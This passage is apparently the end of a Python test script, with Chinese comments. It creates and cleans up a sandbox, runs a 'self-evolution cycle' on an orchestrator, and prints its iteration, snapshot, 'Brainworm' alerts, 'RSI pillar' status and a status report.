    sandbox = orch.sandbox_mgr.create_sandbox("test_evoc")
    if sandbox.get("sandbox_id"):
        print(f"   沙箱已创建: {sandbox['sandbox_id']}")
        orch.sandbox_mgr.cleanup_sandbox(sandbox["sandbox_id"])
        print(f"   沙箱已清理")

    # 测试 3: 自进化循环
    print("\n3. 自进化循环测试:")
    result = orch.run_evolution_cycle()
    print(f"   循环: {result['iteration']}, 快照: {result['snapshot']}")
    print(f"   Brainworm 告警: {result['brainworm_alerts']}")
    print(f"   RSI 五柱状态: {json.dumps(result['rsi_pillars'], indent=2, ensure_ascii=False)[:200]}")

    # 测试 4: 状态报告
    print("\n4. 状态报告:")
    status = orch.status_report()
    print(json.dumps(status, indent=2, ensure_ascii=False)[:500])

```
